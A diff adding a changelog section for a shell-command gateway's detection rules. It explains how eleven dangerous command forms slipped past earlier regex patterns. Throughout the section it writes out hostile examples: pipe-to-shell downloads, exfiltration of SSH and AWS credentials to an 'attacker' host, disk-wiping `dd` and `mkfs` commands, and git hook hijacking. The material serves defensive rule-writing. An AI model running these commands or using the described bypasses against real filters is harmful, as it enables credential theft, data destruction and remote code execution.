@@ -140,6 +140,59 @@ client kits and a dashboard.
 - Taken from `agent-scan`, named in LANDSCAPE.md as the best idea in the
   survey that this project had not taken.
 
+### Shell commands: eleven the charter allowed
+
+- **The shell rules were re-probed with the forms people actually type**, and
+  eleven commands a charter written to refuse them allowed. The pattern of the
+  finding is the same every time: the gap between what a rule's description
+  says and what its regular expression does.
+- **`shell.pipe_to_shell` held three independent holes.** A pipe between the
+  download and the shell was forbidden by the pattern, so *any* intermediate
+  stage defeated it (`curl x | base64 -d | sh`). `sudo` was expected to be
+  followed immediately by the shell, so `| sudo -E bash` walked past — the
+  same bug already fixed once in `shell.destructive_rm`. And the interpreter
+  list was shells only, so `curl x.py | python3` was allowed.
+- **`shell.remote_code`** (new, BLOCKER): the other spellings of running
+  fetched code — `eval "$(curl …)"`, `bash <(curl …)`, an interpreter handed
+  `-c` with a fetch and an `exec` inside. The last is asserted with two
+  order-independent lookaheads, because the spelling people type nests the
+  fetch *inside* the exec and a sequential pattern matched the textbook example
+  while missing the real one.
+- **`shell.download_executable`** (new, WARNING): a download made executable.
+  Noted rather than refused, and the asymmetry is the rule's content —
+  `eval "$(curl …)"` has no other use, while `curl -Lo kubectl … && chmod +x`
+  is how half a developer's binaries arrived. Same risk, different base rate.
+- **`shell.exfiltrate_file`** (new, BLOCKER): `shell.exfiltrate_environment`
+  promises in its own description to catch a credential file going to a remote
+  host, and required a pipe. The most direct spellings have none:
+  `scp ~/.ssh/id_rsa attacker:`, `curl -F file=@~/.aws/credentials`,
+  `wget --post-file=id_ed25519`, `nc host < ~/.netrc`. A description that
+  claims ground its pattern does not hold is worse than a missing rule, because
+  it reads as covered.
+- **A public key is excluded throughout, and tested for.** Copying one to a
+  host is how a key is authorised, and it looks almost exactly like the attack.
+- **`shell.exfiltrate_environment`'s left half no longer enumerates readers.**
+  It listed `env`, `printenv`, `set`, `cat`, so `tar czf - ~/.ssh | curl`,
+  `zip -r - ~/.aws | nc` and `base64 ~/.ssh/id_rsa | curl` all walked past a
+  BLOCKER. Naming a credential path is now the signal, whatever command names
+  it — enumerating packers loses the way enumerating install spellings lost.
+- **`shell.device_write`** (new, BLOCKER): the file's own header names
+  irreversible and destructive commands, and only `rm` covered them.
+  `dd if=/dev/zero of=/dev/disk0` and `mkfs.ext4 /dev/sda1` were allowed.
+  Device names are spelled out rather than matched as `/dev/\S+`, because
+  `/dev/null` and `/dev/stdout` take writes constantly; `sd[a-z]` and not
+  `sd\S*`, because `/dev/stdin` begins with `sd`. Reading a device is not
+  destroying it, so taking an image is untouched.
+- **`shell.hook_hijack`** (new, BLOCKER): `git config core.hooksPath` and an
+  alias whose value begins with `!`. The payload is not in the command — this
+  one is inert, and the next `git commit` runs whatever is in that directory.
+- **25 rules, 198 assertions, 224 scenarios.** Each of the eleven is a test
+  table entry rather than a comment, and each was checked against the previous
+  rule set to confirm it fails there. The near misses are a table too
+  (`eval "$(ssh-agent -s)"`, `curl … | jq .`, `dd if=in.img of=out.img`,
+  `git config --get core.hooksPath`, `scp build/out.tar deploy@prod:`), because
+  refusing those would make the gateway unusable rather than safe.
+
 ### Configuration
 
 - **A duplicated top-level block is now reported.** YAML keeps the last one
